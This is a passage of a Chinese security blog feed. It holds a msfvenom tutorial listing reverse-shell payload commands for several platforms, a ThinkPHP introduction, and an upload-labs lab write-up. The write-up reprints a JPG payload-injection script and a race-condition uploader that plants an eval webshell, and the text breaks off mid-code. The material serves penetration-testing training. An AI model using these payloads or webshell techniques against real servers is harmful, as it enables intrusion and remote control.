    <content type="text"><![CDATA[前言Liunx下能够构造shell反弹脚本有很多常见的如bash，netcat、socat以及各种语言如果想具体了解的话可以看这里，当然今天主要内容是详细介绍msfvenom如何生成shell脚本。 正文metasploit-framework介绍Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。–维基百科 如何安装metasploit-framework？在kali-Linux中有自带metasploit-framework当然假如你已经有了一个基于 Debian 的 Linux 环境 如ubuntu你可以通过以下命令下载 123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \ chmod 755 msfinstall &amp;&amp; \ ./msfinstall 当然假如你是windows系统那么可以通过 https://windows.metasploit.com/metasploitframework-latest.msi 下载并且安装 Mac下安装metasploitmac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。msfconsole路径： /opt/metasploit-framework/binmsf的插件路径： /opt/metasploit-framework/embedded/framework/modules/exploits 当然假如以上步骤都不可以那么建议可以在metasploit-framework官网上进行安装传送门 如何深入了解metasploit-framework?通过阅读metasploit-framework官方手册你可以快速入门metasploit-framework msfvenom 介绍MSFvenom是Msfpayload和Msfencode的组合，将这两个工具放在一个Framework实例中。可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线msfvenom的优点是： 一个工具标准化命令行选项提高速度 msfvenom 使用如何生成一个有效的反弹shell脚本呢我们可以看一个例子，输入下面msfvenom命令行及其输出的示例： msfvenom -a x86 –platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f python 查看支持的输出文件类型： msfvenom –help-formats 如果想要查看Framework的有效负载，可以执行 msfvenom -l payloads msfvenom -l nops 基础payload命令格式 1msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt; 通常，这可能是您使用msfvenom的方式： ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker’s IP] lport=4444 -f exe -o /tmp/my_payload.exe 参数解释-e如何编码有效负载？默认情况下，使用-b标志（badchar标志）时，编码功能将自动启动。在其他情况下，您必须使用-e标志，如下所示： 如下所示：./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw 查看支持的编码方式：(为了达到免杀的效果)msfvenom -l encoders 查看支持的空字段模块：(为了达到免杀的效果)msfvenom -l nops -f-f标志：指定有效负载的格式语法示例：./msfvenom -p windows/meterpreter/bind_tcp -f exe LHOST/LPORT LHOST - 该参数表示你想让你的监听器绑定的 IP 地址LPORT - 该参数表示你想让你的监听器绑定的端口号 LHOST - 从字面上看，该参数表示你想让你的目标机器连接的地址。如果你在一个本地局域网，那么你的目标机器可能就不能直接连接到你的机器了，除非你们在同一个网络中。这种情况下，你需要 找到你的公网IP ，然后在你的网络中配置端口转发连接到你自己的用来攻击的电脑。LHOST 这个参数不可以被设置为 localhost, 0.0.0.0, 127.0.0.1，如果你这么设置了，那么你其实在让目标机器连接自己。LPORT - 这个参数表示目标机器要连接的端口号 -b如何避免部分字符过滤呢-b标志用于避免有效负载中的某些字符。使用此选项时，msfvenom将自动找到合适的编码器来编码有效负载： ./msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw -p-p：指定要生成的有效负载 Linux 反向连接： 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf 正向连接： 1msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf Windows 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.ex Mac 12msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb Payloads PHP 12msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php ASP 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp JSP 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp WAR 12msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.waScripting Payloads Python 1msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py Bash 1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl 1msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl Linux Based Shellcode 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Windows Based Shellcode 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt; Mac Based Shellcode 12msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;Handlers 自选模块生成执行计算器payload例子: msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe 友情链接查资料的时候发现这位大佬总结的特别好，还想深入了解metasploit直接传送门 参考 https://xz.aliyun.com/t/2381https://www.anquanke.com/post/id/87017https://www.offensive-security.com/metasploit-unleashed/msfvenom/https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenomhttps://xz.aliyun.com/t/2380https://thief.one/2017/08/01/1/]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Matesploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始学习PHP框架之ThinkPHP]]></title>
    <url>%2F2019%2F02%2F17%2F%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8BThinkPHP%2F</url>
    <content type="text"><![CDATA[前言现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。 正文一、PHP框架的简要介绍形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。我们通常认为PHP框架的作用相当于模型-视图-控制器（Model ViewController）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。 二、php常见框架在Github上搜索PHP在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，在谷歌走势图中laravel在世界始终是排名第一，并且远远超过其他但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，在中国还是thinkPHP以及yii2比较流行 三、如何上手一个新的框架如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架1、你好世界（hello world）这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。 2、计算器（calculator）写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。 3、留言板（guestbook）让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。 4、解析和分页（parse and paginate）选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。 完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。 记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。 四、开发环境搭建环境：Visual Studio Code PHPstudy xdebug 用Visual Studio Code Debug世界上最好语言 五、thinkPHP毕竟thinkPHP可以说是在中国最受欢迎的PHP框架所以我们首先学习它. 1、thinkPHP简介ThinkPHP(FCS)是一个轻量级的中型框架，是从Java的Struts结构移植过来的中文PHP开发框架。它使用面向对象的开发结构和MVC模式，并且模拟实现了Struts的标签库，各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。 ThinkPHP的宗旨是简化开发、提高效率、易于扩展，其在对数据库的支持方面已经包括MySQL、MSSQL、Sqlite、PgSQL、 Oracle，以及PDO的支持。ThinkPHP有着丰富的文档和示例，框架的兼容性较强，但是其功能有限，因此更适合用于中小项目的开发。 优点： 1.易于上手，有丰富的中文文档； 2.框架的兼容性较强，PHP4和PHP5完全兼容、完全支持UTF8等。 适合用于中小项目的开发 缺点： 1.对Ajax的支持不是很好； 2.目录结构混乱，需要花时间整理； 3.上手容易，但是深入学习较难。 1、基于ThinkPHP输出hello world零基础的化直接看ThinkPHP5入门实例教程想较为深入了解的话可以看官方的开发手册ThinkPHP5完全开发手册几个注意事项 1.ThinkPHP完整版和核心版区别在于:完整版比核心版多了很多扩展插件，而核心版只有核心函数 2、基于ThinkPHP的教师管理加深下印象ThinkPHP5入门实例教程Navicat for MySQL 安装和破解（完美) 3、深入如果还想继续了解ThinKPHP的话继续看ThinkPHP5入门实例教程就好了。当然如果想对ThinkPHP整体有着深入了解的话可以去专研ThinkPHP5完全开发手册 3.ThinkPHP安全1.输入安全永远不要相信用户提交的数据，建议务必遵守下面规则：设置public目录为唯一对外访问目录，不要把资源文件放入应用目录；开启表单令牌验证避免数据的重复提交，能起到CSRF防御作用；使用框架提供的请求变量获取方法（Request类param方法及input助手函数）而不是原生系统变量获取用户输入数据；对不同的应用需求设置default_filter过滤规则（默认没有任何过滤规则），常见的安全过滤函数包括stripslashes、htmlentities、htmlspecialchars和strip_tags等，请根据业务场景选择最合适的过滤方法；使用验证类或者验证方法对业务数据设置必要的验证规则；如果可能开启强制路由或者设置MISS路由规则，严格规范每个URL请求； 2.数据库安全尽量少使用数组查询条件而应该使用查询表达式替代；尽量少使用字符串查询条件，如果不得已的情况下 使用手动参数绑定功能；不要让用户输入决定要查询或者写入的字段；对于敏感数据在输出的时候使用hidden方法进行隐藏；对于数据的写入操作应当做好权限检查工作；写入数据严格使用field方法限制写入字段；对于需要输出到页面的数据做好必要的XSS过滤； 3.上传安全统的think\File提供了文件上传的安全支持，包括对文件后缀、文件类型、文件大小以及上传图片文件的合法性检查，确保你已经在上传操作中启用了这些合法性检查。 为了方便版本升级，并且保证public目录为唯一的web可访问目录，资源文件可以放到项目之外，例如项目目录为 /home/www/thinkphp/ 那么资源目录、上传文件保存的目录 /home/www/resource//home/www/resource/upload/ 为了项目的可维护性，目录操作最好不超出本项目的根目录，所以需要把resource目录映射到根目录 ln -s /home/www/resource/ /home/www/thinkphp/resource/ 如果上传文件也需要web访问，可以生成一个软连接到public ln -s /home/www/thinkphp/resource/upload/ /home/www/thinkphp/public/upload/ 参考 https://my.oschina.net/justjavac/blog/70393https://blog.csdn.net/qq_16030133/article/details/81067544http://www.devacg.com/?post=842https://blog.csdn.net/Vezn_King/article/details/75453717https://zhuanlan.zhihu.com/p/25844268]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>php框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[upload-labs-writeup 16~20]]></title>
    <url>%2F2019%2F02%2F16%2Fupload-labs-writeup%2016~20%2F</url>
    <content type="text"><![CDATA[前言 upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone https://github.com/c0ny1/upload-labs.git 来搭建属于自己的一个upload练习靶场 正文 Pass-016 二次渲染绕过先看下源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $filetype = $_FILES[&apos;upload_file&apos;][&apos;type&apos;]; $tmpname = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $target_path=UPLOAD_PATH.&apos;/&apos;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 这是基于白名单的过滤这次的判断不仅仅是判断文件后缀，还要判断文件是要对于类型的，感觉图片🐎依旧是能够绕过，（什么是图片🐎可以看之前文章）尝试下？？？那么这个又是神马用处？？？但是用winhex打开图片🐎，拉到最下面我的🐎呢？？？？🐎跑哪里去了？？？原来这关里用到了php的imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。原来如此，斗气化🐎也不是万能的，那么我们如何绕过呢？这里又一个非常明显的逻辑错误这里首先当这个图片🐎不是真正图片的时候它就不会进行二次渲染那么我们直接将PHP文件改成JPG形式的🐎就可以绕过了。我们尝试下但是其实已经上传成功了，然鹅这只是我们想想而已如果判断错误会有个unlink函数，直接将我们上传的图片删除了那么我们该如何绕过呢？我们先将php的代码放在中间失败，具体可以看这里 这里采取国外大牛的一个脚本，将jpg改成图片🐎绕过二次渲染限制国外大牛，有兴趣的可以点这个 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) &#123; die(&apos;php-gd is not installed&apos;); &#125; if(!isset($argv[1])) &#123; die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&apos;Incorrect SOI marker&apos;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) &#123; die(&apos;Success!&apos;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&apos;payload_&apos;.$argv[1]); die(&apos;Something\&apos;s wrong&apos;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &apos;&apos;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&apos;File not exists [&apos;.$filename.&apos;]&apos;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&apos;End Of File&apos;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&apos;End Of File&apos;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 随便找张jpg的图片然后 命名为1.jpg 然后使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg然而貌似不可以最后会出现错误 原因未知展示下其他方法改gif的简单 上传一个gif图片用winhex对比 视图 同步比较在没有变化的地方添加 一句话木马上传即成功嗯，小别致可真东西 Pass-017 条件竞争看下源码 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&apos;submit&apos;]))&#123; $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &apos;上传出错！&apos;; &#125;&#125; 看了这个源码，我一度怀疑这个题目是不是出错了？这个不是只是一个白名单吗？直接上传一个jpg/png/gif的马不就好了吗？尝试下，直接上传成功然而这个题目本意并非如此，因为上传的图片会被改名我们如何上传一个不会改名的图片呢？这里可以使用竞争上传的方式去突破，同时使用多个进程去上传php文件，php文件的内容是向服务器目录下写一个webshell，之后不断去去访问上传的php文件，如果在删除该php文件之前访问到了该php文件，就会向服务器目录写一个webshell，用python去实现多进程上传详细来自这里 123456789101112131415161718#coding=utf-8import requestsfrom multiprocessing import Pooldef CompeteUpload(list): url=&quot;http://192.168.242.128/upload-labs/Pass-17/index.php&quot; geturl=&quot;http://192.168.242.128/upload-labs/upload/info.php&quot; file=&#123;&apos;upload_file&apos;:(&apos;info.php&apos;,&quot;&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[ironman]);?&gt;&apos;);?&gt;&quot;,&apos;image/jpeg&apos;)&#125; data=&#123;&apos;submit&apos;:&apos;上传&apos;&#125; r=requests.post(url=url,data=data,files=file) #print &quot;test upload....&quot; r1=requests.get(url=geturl) if r1.status_code==200: print &quot;upload success!&quot;if __name__==&quot;__main__&quot;: pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join() 上传成功，当然我们也可以通过Burpsuit进行暴力上传这里就不演示了 Pass-018 条件竞争源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&apos;upload_file&apos;][&apos;name&apos;], $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;upload_file&apos;][&apos;size&apos;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &apos;文件已经被上传，但没有重命名。&apos;; break; case -1: $msg = &apos;这个文件不能上传到服务器的临时文件存储目录。&apos;; break; case -2: $msg = &apos;上传失败，上传目录不可写。&apos;; break; case -3: $msg = &apos;上传失败，无法上传该类型文件。&apos;; break; case -4: $msg = &apos;上传失败，上传的文件过大。&apos;; break; case -5: $msg = &apos;上传失败，服务器已经存在相同名称文件。&apos;; break; case -6: $msg = &apos;文件无法上传，文件不能复制到目标目录。&apos;; break; default: $msg = &apos;未知错误！&apos;; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; 嗯图片马再次上传成功这里大概是采取白名单的形式我们可以看到move在rename的前面所以我们可以采取竞争的形式上传shell具体不演示了 Pass-019 00截断/./过滤源码 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&apos;save_name&apos;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &apos;上传出错！&apos;; &#125; &#125;else&#123; $msg = 